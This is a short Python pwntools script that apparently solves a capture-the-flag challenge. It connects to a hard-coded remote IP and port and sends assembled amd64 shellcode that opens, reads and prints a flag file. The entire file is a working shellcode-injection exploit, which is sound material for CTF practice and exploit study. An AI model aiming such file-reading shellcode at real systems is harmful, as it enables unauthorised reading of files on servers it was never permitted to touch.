#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

# Connect
io = remote('159.89.106.147', 1337)

# Receive prompt
io.recvuntil(b'Send shellcode (max 4096 bytes): \n')

# Shellcode to: open("flag_random_name.txt"), read it, write to stdout
shellcode = asm('''
    /* open("flag_random_name.txt", O_RDONLY) */
    mov rax, 2
    lea rdi, [rip+filename]
    xor rsi, rsi
    xor rdx, rdx
    syscall
    
    /* read(fd, buf, 100) */
    mov rdi, rax
    lea rsi, [rip+buffer]
    mov rdx, 100
    xor rax, rax
    syscall
    
    /* write(1, buf, rax) */
    mov rdx, rax
    mov rdi, 1
    lea rsi, [rip+buffer]
    mov rax, 1
    syscall
    
    /* exit(0) */
    mov rax, 60
    xor rdi, rdi
    syscall
    
    filename:
    .string "flag_random_name.txt"
    buffer:
    .space 100
''')

print(f"Sending shellcode ({len(shellcode)} bytes)")
io.send(shellcode + b'\n')

# Get the flag
time.sleep(1)
output = io.recvall(timeout=2)
print("\n=== FLAG ===")
print(output.decode(errors='ignore'))

io.close()
